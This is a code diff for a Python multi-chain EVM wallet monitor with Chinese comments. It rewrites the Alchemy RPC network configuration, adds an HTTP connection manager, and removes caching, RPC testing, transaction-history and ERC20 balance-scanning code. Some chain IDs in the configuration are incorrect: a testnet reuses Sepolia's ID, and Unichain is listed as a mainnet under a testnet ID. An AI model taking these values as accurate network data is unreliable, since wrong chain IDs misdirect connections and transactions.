-            'type': 'testnet',
-            'priority': 31
-        },
-        'base_sepolia': {
-            'name': 'Base Sepolia',
-            'chain_id': 84532,
-            'currency': 'ETH',
-            'rpc_url': f'https://base-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 32
-        },
-        'zksync_sepolia': {
-            'name': 'zkSync Sepolia',
-            'chain_id': 300,
-            'currency': 'ETH',
-            'rpc_url': f'https://zksync-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 33
-        },
-        'linea_sepolia': {
-            'name': 'Linea Sepolia',
-            'chain_id': 59141,
-            'currency': 'ETH',
-            'rpc_url': f'https://linea-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 34
-        },
-        'scroll_sepolia': {
-            'name': 'Scroll Sepolia',
-            'chain_id': 534351,
-            'currency': 'ETH',
-            'rpc_url': f'https://scroll-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 35
-        },
-        'mantle_testnet': {
-            'name': 'Mantle Testnet',
-            'chain_id': 5001,
-            'currency': 'MNT',
-            'rpc_url': f'https://mantle-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 36
-        },
-        'celo_alfajores': {
-            'name': 'Celo Alfajores',
-            'chain_id': 44787,
-            'currency': 'CELO',
-            'rpc_url': f'https://celo-alfajores.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 37
-        },
-        'gnosis_chiado': {
-            'name': 'Gnosis Chiado',
-            'chain_id': 10200,
-            'currency': 'xDAI',
-            'rpc_url': f'https://gnosis-chiado.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 38
-        },
-        'opbnb_testnet': {
-            'name': 'opBNB Testnet',
-            'chain_id': 5611,
-            'currency': 'BNB',
-            'rpc_url': f'https://opbnb-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 39
-        },
-        
-        # ============= 新增EVM兼容测试网 =============
-        'blast_sepolia': {
-            'name': 'Blast Sepolia',
-            'chain_id': 168587773,
-            'currency': 'ETH',
-            'rpc_url': f'https://blast-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 40
-        },
-        'sonic_blaze': {
-            'name': 'Sonic Blaze',
-            'chain_id': 57054,
-            'currency': 'S',
-            'rpc_url': f'https://sonic-blaze.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 41
-        },
-        'abstract_testnet': {
-            'name': 'Abstract Testnet',
-            'chain_id': 11155111,  # 使用Sepolia链ID作为测试网
-            'currency': 'ETH',
-            'rpc_url': f'https://abstract-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 42
-        },
-        'lumia_testnet': {
-            'name': 'Lumia Testnet',
-            'chain_id': 8866,
-            'currency': 'LUMIA',
-            'rpc_url': f'https://lumia-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 43
-        },
-        'ink_sepolia': {
-            'name': 'Ink Sepolia',
-            'chain_id': 763373,
-            'currency': 'ETH',
-            'rpc_url': f'https://ink-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 44
-        },
-        'story_aeneid': {
-            'name': 'Story Aeneid',
-            'chain_id': 1514,
-            'currency': 'IP',
-            'rpc_url': f'https://story-aeneid.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 45
-        },
-        'anime_testnet': {
-            'name': 'Anime Testnet',
-            'chain_id': 11502,
-            'currency': 'ANIME',
-            'rpc_url': f'https://anime-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 46
-        },
-        'botanix_testnet': {
-            'name': 'Botanix Testnet',
-            'chain_id': 3637,
-            'currency': 'BTC',
-            'rpc_url': f'https://botanix-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 47
-        },
-        'crossfi_testnet': {
-            'name': 'CrossFi Testnet',
-            'chain_id': 4158,
-            'currency': 'XFI',
-            'rpc_url': f'https://crossfi-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 48
-        },
-        'shape_sepolia': {
-            'name': 'Shape Sepolia',
-            'chain_id': 11011,
-            'currency': 'ETH',
-            'rpc_url': f'https://shape-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 49
-        },
-        'geist_testnet': {
-            'name': 'Geist Testnet',
-            'chain_id': 63158,
-            'currency': 'GEIST',
-            'rpc_url': f'https://geist-testnet.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 50
-        },
-        'superseed_sepolia': {
-            'name': 'Superseed Sepolia',
-            'chain_id': 5331,
-            'currency': 'SEED',
-            'rpc_url': f'https://superseed-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 51
-        }
+# 完整的EVM/L2链条配置（纯RPC模式）
+ALCHEMY_NETWORK_CONFIG = {
+    # Ethereum
+    'ethereum': {
+        'name': 'Ethereum 主网',
+        'chain_id': 1,
+        'currency': 'ETH',
+        'rpc_url': f'https://eth-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 1
+    },
+    'ethereum_sepolia': {
+        'name': 'Ethereum Sepolia',
+        'chain_id': 11155111,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://eth-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 2
+    },
+    'ethereum_goerli': {
+        'name': 'Ethereum Goerli',
+        'chain_id': 5,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://eth-goerli.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 3
+    },
+    
+    # Polygon
+    'polygon': {
+        'name': 'Polygon 主网',
+        'chain_id': 137,
+        'currency': 'MATIC',
+
+        'rpc_url': f'https://polygon-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 4
+    },
+    'polygon_mumbai': {
+        'name': 'Polygon Mumbai',
+        'chain_id': 80001,
+        'currency': 'MATIC',
+
+        'rpc_url': f'https://polygon-mumbai.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 5
+    },
+    'polygon_amoy': {
+        'name': 'Polygon Amoy',
+        'chain_id': 80002,
+        'currency': 'MATIC',
+        'sdk_network': None,
+        'rpc_url': f'https://polygon-amoy.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 6
+    },
+    
+    # Arbitrum
+    'arbitrum': {
+        'name': 'Arbitrum 主网',
+        'chain_id': 42161,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://arb-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 7
+    },
+    'arbitrum_goerli': {
+        'name': 'Arbitrum Goerli',
+        'chain_id': 421613,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://arb-goerli.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 8
+    },
+    'arbitrum_sepolia': {
+        'name': 'Arbitrum Sepolia',
+        'chain_id': 421614,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://arb-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 9
+    },
+    'arbitrum_nova': {
+        'name': 'Arbitrum Nova',
+        'chain_id': 42170,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://arbnova-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 10
+    },
+    
+    # Optimism
+    'optimism': {
+        'name': 'Optimism 主网',
+        'chain_id': 10,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://opt-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 11
+    },
+    'optimism_goerli': {
+        'name': 'Optimism Goerli',
+        'chain_id': 420,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://opt-goerli.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 12
+    },
+    'optimism_kovan': {
+        'name': 'Optimism Kovan',
+        'chain_id': 69,
+        'currency': 'ETH',
+
+        'rpc_url': f'https://opt-kovan.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 13
+    },
+    'optimism_sepolia': {
+        'name': 'Optimism Sepolia',
+        'chain_id': 11155420,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://opt-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 14
+    },
+    
+    # Base
+    'base': {
+        'name': 'Base 主网',
+        'chain_id': 8453,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://base-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 15
+    },
+    'base_sepolia': {
+        'name': 'Base Sepolia',
+        'chain_id': 84532,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://base-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 16
+    },
+    
+    # Polygon zkEVM
+    'polygon_zkevm': {
+        'name': 'Polygon zkEVM',
+        'chain_id': 1101,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://polygonzkevm-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 17
+    },
+    'polygon_zkevm_testnet': {
+        'name': 'Polygon zkEVM Testnet',
+        'chain_id': 1442,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://polygonzkevm-testnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 18
+    },
+    
+    # zkSync Era
+    'zksync': {
+        'name': 'zkSync Era',
+        'chain_id': 324,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://zksync-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 19
+    },
+    'zksync_sepolia': {
+        'name': 'zkSync Sepolia',
+        'chain_id': 300,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://zksync-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 20
+    },
+    
+    # Linea
+    'linea': {
+        'name': 'Linea 主网',
+        'chain_id': 59144,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://linea-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 21
+    },
+    'linea_sepolia': {
+        'name': 'Linea Sepolia',
+        'chain_id': 59141,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://linea-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 22
+    },
+    
+    # Scroll
+    'scroll': {
+        'name': 'Scroll 主网',
+        'chain_id': 534352,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://scroll-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 23
+    },
+    'scroll_sepolia': {
+        'name': 'Scroll Sepolia',
+        'chain_id': 534351,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://scroll-sepolia.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 24
+    },
+    
+    # BSC (Binance Smart Chain)
+    'bsc': {
+        'name': 'BNB Smart Chain',
+        'chain_id': 56,
+        'currency': 'BNB',
+        'sdk_network': None,
+        'rpc_url': f'https://bnb-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 25
+    },
+    'bsc_testnet': {
+        'name': 'BNB Smart Chain Testnet',
+        'chain_id': 97,
+        'currency': 'BNB',
+        'sdk_network': None,
+        'rpc_url': f'https://bnb-testnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 26
+    },
+    
+    # Avalanche
+    'avalanche': {
+        'name': 'Avalanche C-Chain',
+        'chain_id': 43114,
+        'currency': 'AVAX',
+        'sdk_network': None,
+        'rpc_url': f'https://avax-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 27
+    },
+    'avalanche_fuji': {
+        'name': 'Avalanche Fuji',
+        'chain_id': 43113,
+        'currency': 'AVAX',
+        'sdk_network': None,
+        'rpc_url': f'https://avax-fuji.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 28
+    },
+    
+    # 其他重要EVM/L2链条...
+    'blast': {
+        'name': 'Blast 主网',
+        'chain_id': 81457,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://blast-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 29
+    },
+    'zetachain': {
+        'name': 'ZetaChain 主网',
+        'chain_id': 7000,
+        'currency': 'ZETA',
+        'sdk_network': None,
+        'rpc_url': f'https://zetachain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 30
+    },
+    'celo': {
+        'name': 'Celo 主网',
+        'chain_id': 42220,
+        'currency': 'CELO',
+        'sdk_network': None,
+        'rpc_url': f'https://celo-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 31
+    },
+    'astar': {
+        'name': 'Astar 主网',
+        'chain_id': 592,
+        'currency': 'ASTR',
+
+        'rpc_url': f'https://astar-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 32
+    },
+    
+    # 更多主流EVM/L2链条
+    'gnosis': {
+        'name': 'Gnosis Chain',
+        'chain_id': 100,
+        'currency': 'xDAI',
+        'sdk_network': None,
+        'rpc_url': f'https://gnosis-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 33
+    },
+    'gnosis_chiado': {
+        'name': 'Gnosis Chiado',
+        'chain_id': 10200,
+        'currency': 'xDAI',
+        'sdk_network': None,
+        'rpc_url': f'https://gnosis-chiado.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'testnet',
+        'priority': 34
+    },
+    'metis': {
+        'name': 'Metis 主网',
+        'chain_id': 1088,
+        'currency': 'METIS',
+        'sdk_network': None,
+        'rpc_url': f'https://metis-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 35
+    },
+    'soneium': {
+        'name': 'Soneium 主网',
+        'chain_id': 1946,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://soneium-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 36
+    },
+    'world_chain': {
+        'name': 'World Chain',
+        'chain_id': 480,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://worldchain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 37
+    },
+    'shape': {
+        'name': 'Shape 主网',
+        'chain_id': 360,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://shape-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 38
+    },
+    'unichain': {
+        'name': 'Unichain 主网',
+        'chain_id': 1301,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://unichain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 39
+    },
+    'apechain': {
+        'name': 'ApeChain 主网',
+        'chain_id': 33139,
+        'currency': 'APE',
+        'sdk_network': None,
+        'rpc_url': f'https://apechain-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 40
+    },
+    'abstract': {
+        'name': 'Abstract 主网',
+        'chain_id': 11124,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://abstract-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 41
+    },
+    'lumia': {
+        'name': 'Lumia 主网',
+        'chain_id': 994873017,
+        'currency': 'LUMIA',
+        'sdk_network': None,
+        'rpc_url': f'https://lumia-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 42
+    },
+    'ink': {
+        'name': 'Ink 主网',
+        'chain_id': 57073,
+        'currency': 'ETH',
+        'sdk_network': None,
+        'rpc_url': f'https://ink-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 43
+    },
+    'rootstock': {
+        'name': 'Rootstock 主网',
+        'chain_id': 30,
+        'currency': 'RBTC',
+        'sdk_network': None,
+        'rpc_url': f'https://rootstock-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 44
+    },
+    'sonic': {
+        'name': 'Sonic 主网',
+        'chain_id': 146,
+        'currency': 'S',
+        'sdk_network': None,
+        'rpc_url': f'https://sonic-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 45
+    },
+    'sei': {
+        'name': 'Sei 主网',
+        'chain_id': 1329,
+        'currency': 'SEI',
+        'sdk_network': None,
+        'rpc_url': f'https://sei-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}',
+        'type': 'mainnet',
+        'priority': 46
     }
+}
 
 def build_supported_networks():
     """构建纯RPC网络系统"""
@@ -1061,11 +543,8 @@ def build_supported_networks():
     testnets: List[str] = []
     network_priority: Dict[str, int] = {}
     
-    # 获取当前网络配置
-    network_config = build_network_config()
-    
     # 处理所有配置的网络（纯RPC模式）
-    for network_key, config in network_config.items():
+    for network_key, config in ALCHEMY_NETWORK_CONFIG.items():
         # 所有网络都使用RPC模式
         supported_networks[network_key] = {
             'mode': 'rpc',
@@ -1082,13 +561,67 @@ def build_supported_networks():
     
     return supported_networks, network_names, mainnets, testnets, network_priority
 
-def refresh_network_config():
-    """刷新网络配置（API密钥切换后调用）"""
-    global SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY
-    SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY = build_supported_networks()
-
 # 构建支持的网络配置
 SUPPORTED_NETWORKS, NETWORK_NAMES, MAINNET_NETWORKS, TESTNET_NETWORKS, NETWORK_PRIORITY = build_supported_networks()
+
+# 配置日志记录
+logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
+
+class ConnectionManager:
+    """连接管理器 - 处理HTTP连接池和超时"""
+    
+    def __init__(self, max_retries=3, backoff_factor=0.3, timeout=10):
+        self.max_retries = max_retries
+        self.backoff_factor = backoff_factor
+        self.timeout = timeout
+        self.session_pool = {}
+        
+        # 配置重试策略
+        self.retry_strategy = Retry(
+            total=max_retries,
+            status_forcelist=[429, 500, 502, 503, 504],
+            backoff_factor=backoff_factor,
+            respect_retry_after_header=True
+        )
+    
+    def get_session(self, network_key: str) -> requests.Session:
+        """获取或创建HTTP会话"""
+        if network_key not in self.session_pool:
+            session = requests.Session()
+            
+            # 配置适配器和重试策略
+            adapter = HTTPAdapter(
+                max_retries=self.retry_strategy,
+                pool_connections=1,
+                pool_maxsize=1,
+                pool_block=False
+            )
+            
+            session.mount("http://", adapter)
+            session.mount("https://", adapter)
+            
+            # 设置超时
+            session.timeout = self.timeout
+            
+            self.session_pool[network_key] = session
+            
+        return self.session_pool[network_key]
+    
+    def close_all_sessions(self):
+        """关闭所有会话"""
+        for session in self.session_pool.values():
+            try:
+                session.close()
+            except:
+                pass
+        self.session_pool.clear()
+    
+    def __del__(self):
+        """析构函数，清理资源"""
+        self.close_all_sessions()
+
+# 全局连接管理器
+connection_manager = ConnectionManager()
 
 @dataclass
 class WalletInfo:
@@ -1114,658 +647,167 @@ class WalletMonitor:
         self.web3_clients: Dict[str, Web3] = {}        # RPC模式客户端
         self.monitoring_active = False
         self.network_status: Dict[str, NetworkStatus] = {}
-        
-        # 🗂️ 缓存系统
-        self.transaction_history_cache: Dict[str, Dict[str, int]] = {}
-        self.rpc_connection_cache: Dict[str, bool] = {}
-        self.first_time_monitoring = True  # 标记是否首次监控
-        
-        # 加载所有数据
         self.load_wallets()
         self.load_network_status()
-        self.load_all_caches()
-        load_transfer_stats()  # 加载转账统计
+        
+        # 注册清理函数
+        import atexit
+        atexit.register(self.cleanup)
     
-    def load_all_caches(self):
-        """加载所有缓存数据"""
-        print(f"{Fore.CYAN}🗂️ 加载缓存数据...{Style.RESET_ALL}")
-        
-        # 加载交易记录缓存
-        self.transaction_history_cache = load_transaction_history_cache()
-        
-        # 加载RPC连接缓存
-        self.rpc_connection_cache = load_rpc_connection_cache()
-        
-        # 检查是否首次监控
-        if self.transaction_history_cache or self.rpc_connection_cache:
-            self.first_time_monitoring = False
-            print(f"{Fore.GREEN}📂 发现缓存数据，将使用已有的扫描记录{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.YELLOW}📂 首次运行，将执行完整扫描{Style.RESET_ALL}")
-    
-    def save_all_caches(self):
-        """保存所有缓存数据"""
-        save_transaction_history_cache(self.transaction_history_cache)
-        save_rpc_connection_cache(self.rpc_connection_cache)
-        
-    async def dynamic_rpc_test(self) -> Dict[str, bool]:
-        """动态测试所有RPC连接，返回可用网络列表"""
-        # 如果有缓存且不是首次监控，优先使用缓存
-        if not self.first_time_monitoring and self.rpc_connection_cache:
-            print(f"\n{Fore.GREEN}📂 使用RPC连接缓存 ({sum(self.rpc_connection_cache.values())}/{len(self.rpc_connection_cache)} 个网络可用){Style.RESET_ALL}")
-            
-            # 将缓存的连接状态应用到web3_clients
-            for network_key, is_available in self.rpc_connection_cache.items():
-                if is_available and network_key not in self.web3_clients:
-                    # 按需加载网络连接
-                    self.load_network_on_demand(network_key)
-            
-            return self.rpc_connection_cache
-        
-        print(f"\n{Fore.CYAN}🔍 动态测试RPC连接 - 检测可用网络...{Style.RESET_ALL}")
-        
-        available_networks = {}
-        network_config = build_network_config(use_rotation=True)
-        
-        # 并发测试所有网络
-        async def test_single_rpc(network_key: str):
-            try:
-                config = network_config.get(network_key)
-                if not config:
-                    return network_key, False, "配置不存在"
-                
-                # 创建Web3连接
-                web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 8}))
-                
-                # 测试连接 - 使用event loop executor执行同步操作
-                loop = asyncio.get_event_loop()
-                block_number = await loop.run_in_executor(None, web3.eth.get_block_number)
-                
-                # 验证响应
-                if isinstance(block_number, int) and block_number > 0:
-                    # 保存可用的客户端
-                    self.web3_clients[network_key] = web3
-                    return network_key, True, f"区块高度: {block_number}"
-                else:
-                    return network_key, False, "无效响应"
-                    
-            except Exception as e:
-                error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
-                return network_key, False, error_msg
-        
-        # 限制并发数量
-        semaphore = asyncio.Semaphore(5)
-        
-        async def test_with_limit(network_key):
-            async with semaphore:
-                return await test_single_rpc(network_key)
-        
-        # 执行并发测试
-        tasks = [test_with_limit(net_key) for net_key in network_config.keys()]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # 处理结果
-        success_count = 0
-        mainnet_count = 0
-        testnet_count = 0
-        failed_networks = []
-        
-        for result in results:
-            if isinstance(result, Exception):
-                continue
-                
-            network_key, success, info = result
-            
-            if success:
-                available_networks[network_key] = True
-                success_count += 1
-                
-                # 更新网络状态
-                self.network_status[network_key] = NetworkStatus(
-                    available=True,
-                    last_check=datetime.now().isoformat(),
-                    error_count=0,
-                    last_error=""
-                )
-                
-                if network_key in MAINNET_NETWORKS:
-                    mainnet_count += 1
-                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (主网) - {info}{Style.RESET_ALL}")
-                else:
-                    testnet_count += 1
-                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (测试网) - {info}{Style.RESET_ALL}")
-            else:
-                available_networks[network_key] = False
-                failed_networks.append((network_key, info))
-                
-                # 更新网络状态
-                self.network_status[network_key] = NetworkStatus(
-                    available=False,
-                    last_check=datetime.now().isoformat(),
-                    error_count=1,
-                    last_error=info
-                )
-        
-        # 显示失败的网络
-        if failed_networks:
-            print(f"\n{Fore.YELLOW}⚠️ 不可用的网络 ({len(failed_networks)}个):{Style.RESET_ALL}")
-            for network_key, error in failed_networks[:5]:  # 只显示前5个
-                print(f"  🔴 {NETWORK_NAMES[network_key]} - {error}")
-            if len(failed_networks) > 5:
-                print(f"  ... 还有 {len(failed_networks) - 5} 个网络不可用")
-        
-        self.save_network_status()
-        
-        print(f"\n{Fore.GREEN}📊 RPC连接测试完成!{Style.RESET_ALL}")
-        print(f"  ✅ 可用网络: {success_count}/{len(network_config)} 个")
-        print(f"  🌐 主网: {mainnet_count} 个")
-        print(f"  🧪 测试网: {testnet_count} 个")
-        print(f"  🔴 不可用: {len(failed_networks)} 个")
-        
-        # 保存RPC连接缓存
-        self.rpc_connection_cache = available_networks
-        save_rpc_connection_cache(self.rpc_connection_cache)
-        
-        return available_networks
-
-    async def check_wallet_transaction_history(self, address: str, available_networks: Dict[str, bool]) -> Dict[str, int]:
-        """检查钱包在各个网络的交易记录"""
-        # 如果有缓存且不是首次监控，优先使用缓存
-        if not self.first_time_monitoring and address in self.transaction_history_cache:
-            cached_networks = self.transaction_history_cache[address]
-            print(f"\n{Fore.GREEN}📂 使用交易记录缓存: {address[:10]}...{address[-8:]} ({len(cached_networks)} 个活跃网络){Style.RESET_ALL}")
-            return cached_networks
-        
-        print(f"\n{Fore.CYAN}📊 检查钱包交易记录: {address[:10]}...{address[-8:]}{Style.RESET_ALL}")
-        
-        wallet_networks = {}
-        
-        # 并发检查所有可用网络的交易记录
-        async def check_tx_history(network_key: str):
-            if not available_networks.get(network_key, False):
-                return network_key, 0, "网络不可用"
-            
-            try:
-                web3 = self.web3_clients.get(network_key)
-                if not web3:
-                    if not self.load_network_on_demand(network_key):
-                        return network_key, 0, "无法连接"
-                    web3 = self.web3_clients.get(network_key)
-                
-                # 使用event loop executor执行同步操作
-                loop = asyncio.get_event_loop()
-                tx_count = await loop.run_in_executor(None, web3.eth.get_transaction_count, address)
-                
-                return network_key, tx_count, "成功"
-                
-            except Exception as e:
-                error_msg = str(e)[:30] + "..." if len(str(e)) > 30 else str(e)
-                return network_key, 0, error_msg
-        
-        # 限制并发数量
-        semaphore = asyncio.Semaphore(8)
-        
-        async def check_with_limit(network_key):
-            async with semaphore:
-                return await check_tx_history(network_key)
-        
-        # 只检查可用的网络
-        available_network_keys = [k for k, v in available_networks.items() if v]
-        
-        print(f"{Fore.CYAN}🔍 并发检查 {len(available_network_keys)} 个可用网络的交易记录...{Style.RESET_ALL}")
-        
-        # 执行并发检查
-        tasks = [check_with_limit(net_key) for net_key in available_network_keys]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # 处理结果
-        active_networks = []
-        total_tx_count = 0
-        
-        for result in results:
-            if isinstance(result, Exception):
-                continue
-                
-            network_key, tx_count, status = result
-            
-            if tx_count > 0:
-                wallet_networks[network_key] = tx_count
-                active_networks.append(network_key)
-                total_tx_count += tx_count
-                
-                network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
-                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} ({network_type}) - {tx_count} 笔交易{Style.RESET_ALL}")
-            else:
-                if status == "成功":  # 连接成功但无交易
-                    print(f"{Fore.BLUE}💡 {NETWORK_NAMES[network_key]} - 无交易记录{Style.RESET_ALL}")
-                else:  # 连接失败
-                    print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {status}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.GREEN}📊 交易记录统计:{Style.RESET_ALL}")
-        print(f"  🎯 有交易记录的网络: {len(active_networks)} 个")
-        print(f"  📊 总交易数量: {total_tx_count} 笔")
-        print(f"  🚫 无交易记录的网络: {len(available_network_keys) - len(active_networks)} 个")
-        
-        # 保存交易记录缓存
-        if wallet_networks:  # 只有当有交易记录时才缓存
-            self.transaction_history_cache[address] = wallet_networks
-            save_transaction_history_cache(self.transaction_history_cache)
-        
-        return wallet_networks
-
-    async def scan_erc20_tokens(self, address: str, network_key: str, web3) -> List[Dict]:
-        """扫描钱包的ERC20代币余额"""
-        if not ERC20_SCAN_ENABLED or network_key not in VALUABLE_ERC20_TOKENS:
-            return []
-        
-        tokens_found = []
-        token_addresses = VALUABLE_ERC20_TOKENS[network_key]
-        
-        print(f"{Fore.CYAN}🪙 扫描 {len(token_addresses)} 个ERC20代币...{Style.RESET_ALL}")
-        
-        for token_address, token_info in token_addresses.items():
-            try:
-                # 创建代币合约实例
-                loop = asyncio.get_event_loop()
-                
-                # 在executor中执行合约调用
-                contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
-                balance = await loop.run_in_executor(None, contract.functions.balanceOf(address).call)
